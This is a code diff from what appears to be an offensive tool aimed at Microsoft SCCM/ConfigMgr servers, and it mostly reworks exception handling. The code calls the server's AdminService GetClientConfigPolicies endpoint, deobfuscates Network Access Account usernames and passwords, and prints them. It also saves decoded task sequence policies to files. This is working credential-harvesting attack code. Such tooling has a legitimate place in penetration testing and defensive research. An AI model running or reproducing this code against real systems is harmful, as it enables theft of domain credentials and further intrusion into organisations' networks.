@@ -92,42 +92,42 @@ class SPEAKTOTHEMANAGER:
         root = ET.fromstring(xml)
         seen_naas = set()  # Track NAA credentials we've already printed
         seen_ts_hashes = set()  # Track task sequences we've already saved
+        
+        try:
+            for elem in root.iter():
+                if elem.get('class') == 'CCM_NetworkAccessAccount':
+                    # Collect username and password first
+                    username = None
+                    password = None
 
-        for elem in root.iter():
-            if elem.get('class') == 'CCM_NetworkAccessAccount':
-                # Collect username and password first
-                username = None
-                password = None
+                    for prop in elem.findall(".//*[@name='NetworkAccessUsername']"):
+                        value = prop.find("value")
+                        if value is not None and value.text:
+                            username = deobfuscate_credential_string(value.text.strip())
+                            username = username[:username.rfind('\x00')]
 
-                for prop in elem.findall(".//*[@name='NetworkAccessUsername']"):
-                    value = prop.find("value")
-                    if value is not None and value.text:
-                        username = deobfuscate_credential_string(value.text.strip())
-                        username = username[:username.rfind('\x00')]
+                    for prop in elem.findall(".//*[@name='NetworkAccessPassword']"):
+                        value = prop.find("value")
+                        if value is not None and value.text:
+                            password = deobfuscate_credential_string(value.text.strip())
+                            password = password[:password.rfind('\x00')]
 
-                for prop in elem.findall(".//*[@name='NetworkAccessPassword']"):
-                    value = prop.find("value")
-                    if value is not None and value.text:
-                        password = deobfuscate_credential_string(value.text.strip())
-                        password = password[:password.rfind('\x00')]
+                    # Only print if we haven't seen this username before
+                    if username and username not in seen_naas:
+                        logger.info("[+] Found NAA Policy")
+                        logger.info(f"[!] Network Access Account Username: {username}")
+                        if password:
+                            logger.info(f"[!] Network Access Account Password: {password}")
+                        seen_naas.add(username)
 
-                # Only print if we haven't seen this username before
-                if username and username not in seen_naas:
-                    logger.info("[+] Found NAA Policy")
-                    logger.info(f"[!] Network Access Account Username: {username}")
-                    if password:
-                        logger.info(f"[!] Network Access Account Password: {password}")
-                    seen_naas.add(username)
-
-            if elem.get('name') == 'TS_Sequence':
-                value_elem = elem.find("value")
-                if value_elem is not None and value_elem.text:
-                    ts_data = value_elem.text.strip()
-                    try:
+                if elem.get('name') == 'TS_Sequence':
+                    value_elem = elem.find("value")
+                    if value_elem is not None and value_elem.text:
+                        ts_data = value_elem.text.strip()
                         ts_sequence = deobfuscate_credential_string(ts_data)
                         ts_hash = hashlib.md5(ts_sequence.encode()).hexdigest()
 
-                        # Only save if we haven't seen this hash before
+                            # Only save if we haven't seen this hash before
                         if ts_hash not in seen_ts_hashes:
                             logger.info("[+] Found Task Sequence policy")
                             # idk what the deal is but there's weird chars at the end so accept the jank
@@ -138,20 +138,21 @@ class SPEAKTOTHEMANAGER:
                                 f.write(pretty_xml)
                                 logger.info(f"[+] task sequence policy saved to ts_sequence_{ts_hash}.xml")
                             seen_ts_hashes.add(ts_hash)
-                    except Exception as e:
-                        print(e)
-                        pass
-                    except:
-                        pass
+        except Exception as e:
+            print(e)
+            pass
 
 
     def get_naa_policies(self):
-        url = f"https://{self.target}/AdminService/wmi/SMS_TaskSequencePackage.GetClientConfigPolicies"
-        response = self.http_request(url)
-        json_response = response.json() 
-        xml_content = (json_response['PolicyXmls'][0])
-        self.parse_xml(xml_content)
-
+        try:
+            url = f"https://{self.target}/AdminService/wmi/SMS_TaskSequencePackage.GetClientConfigPolicies"
+            response = self.http_request(url)
+            json_response = response.json() 
+            xml_content = (json_response['PolicyXmls'][0])
+            self.parse_xml(xml_content)
+        except Exception as e:
+            print(e)
+            pass
 
 
     def get_ts_policy(self, ts_package_ids):
